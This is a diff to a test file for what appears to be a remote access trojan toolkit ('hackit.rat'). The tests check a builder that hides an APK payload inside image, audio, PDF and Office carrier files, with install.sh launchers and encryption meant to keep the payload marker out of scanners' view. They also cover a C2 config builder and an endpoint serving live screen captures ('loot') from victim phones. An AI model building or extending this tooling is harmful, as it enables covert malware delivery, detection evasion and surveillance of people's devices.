@@ -215,7 +215,7 @@ def test_polyglot_roundtrip(tmp_path):
 
     payload = tmp_path / "payload.apk"
     payload.write_bytes(b"PK\x03\x04" + os.urandom(5000))
-    for ext in ("jpg", "png", "webp", "mp3", "mp4", "pdf", "svg", "docx"):
+    for ext in sorted(polyglot.MODES):
         carrier = samples.sample(ext, str(tmp_path))
         result = polyglot.build(carrier, str(payload), out_dir=str(tmp_path / "out"), launchers=True)
         assert polyglot.verify(result.carrier)["ok"], ext
@@ -231,7 +231,7 @@ def test_polyglot_roundtrip(tmp_path):
         else:
             assert polyglot.carve(open(result.carrier, "rb").read()) == payload.read_bytes()
         assert any(p.endswith("carve.py") for p in result.launchers)
-        if ext not in ("docx", "svg"):
+        if ext not in ("svg",):
             assert any(p.endswith("install.sh") for p in result.launchers)
             assert b"\x00" not in open(result.launchers[0], "rb").read()
 
@@ -343,3 +343,43 @@ def test_builder_config_native_port():
     key = base64.b64encode(bytes(range(32))).decode()
     assert builder.make_config("http://1.2.3.4:8443", key, "x", 60000, False, "")["native_port"] == 8543
     assert builder.make_config("https://c2.test", key, "x", 60000, False, "")["native_port"] == 543
+
+
+def test_polyglot_sealed_carriers(tmp_path):
+    from hackit.rat import polyglot, samples
+
+    payload = tmp_path / "p.apk"
+    payload.write_bytes(b"PK\x03\x04" + os.urandom(4000))
+    for ext in sorted(polyglot.MODES):
+        src = samples.sample(ext, str(tmp_path))
+        result = polyglot.build(src, str(payload), out_dir=str(tmp_path / "sealed"), encrypt=True)
+        assert polyglot.verify(result.carrier)["ok"], ext
+        assert result.sealed and len(result.key) == 64
+        blob = polyglot.carve(open(result.carrier, "rb").read())
+        assert polyglot.open_payload(blob, bytes.fromhex(result.key)) == payload.read_bytes()
+        assert open(result.carrier, "rb").read()[:4096].find(blob) < 0
+        assert b"HACKIT-RAT-PAYLOAD" not in open(result.carrier, "rb").read()[:65536]
+        install = [p for p in result.launchers if p.endswith("install.sh")][0]
+        assert result.key in open(install).read()
+
+
+def test_live_frame_endpoint(app, psk):
+    async def scenario():
+        async with TestServer(app) as server_:
+            base = str(server_.make_url(""))
+            store.register("live-1", {"model": "Pixel", "label": "live"}, "1.2.3.4")
+            folder = os.path.join(store.FILES_DIR, "live-1")
+            os.makedirs(folder, exist_ok=True)
+            path = os.path.join(folder, "frame.jpg")
+            open(path, "wb").write(b"\xff\xd8\xffjpegbytes")
+            store.add_loot("live-1", "frame.jpg", path, 11, "screen_frame")
+            async with ClientSession() as http:
+                ok = await http.get(base + "/v1/live/live-1", headers={"X-Token": app["hub"].token})
+                assert ok.status == 200
+                assert await ok.read() == b"\xff\xd8\xffjpegbytes"
+                bad = await http.get(base + "/v1/live/live-1")
+                assert bad.status == 403
+                missing = await http.get(base + "/v1/live/none", headers={"X-Token": app["hub"].token})
+                assert missing.status == 404
+
+    run(scenario())
